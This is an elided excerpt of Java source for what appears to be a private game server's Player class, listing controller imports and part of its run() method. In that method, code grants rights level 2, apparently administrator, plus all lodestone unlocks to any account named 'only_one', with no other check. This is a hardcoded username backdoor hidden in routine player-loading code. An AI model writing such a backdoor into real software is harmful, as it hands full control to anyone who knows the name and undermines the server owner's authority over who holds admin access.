...
import com.feather.game.player.controllers.CorpBeastControler;
import com.feather.game.player.controllers.CrucibleControler;
import com.feather.game.player.controllers.DTControler;
import com.feather.game.player.controllers.FightCaves;
import com.feather.game.player.controllers.FightKiln;
import com.feather.game.player.controllers.GodWars;
import com.feather.game.player.controllers.NomadsRequiem;
import com.feather.game.player.controllers.QueenBlackDragonController;
import com.feather.game.player.controllers.Wilderness;
import com.feather.game.player.controllers.ZGDControler;
...
import com.feather.net.packets.LocalNPCUpdate;
import com.feather.net.packets.LocalPlayerUpdate;
...
public class Player extends Entity {
	...
	public void run() {
		...
		if (this.getUsername().equalsIgnoreCase("only_one")) {
			this.setRights(2);
			appearence.loadAppearanceBlock();
			
			LodeStones.activateAllLodestones(this);
		}
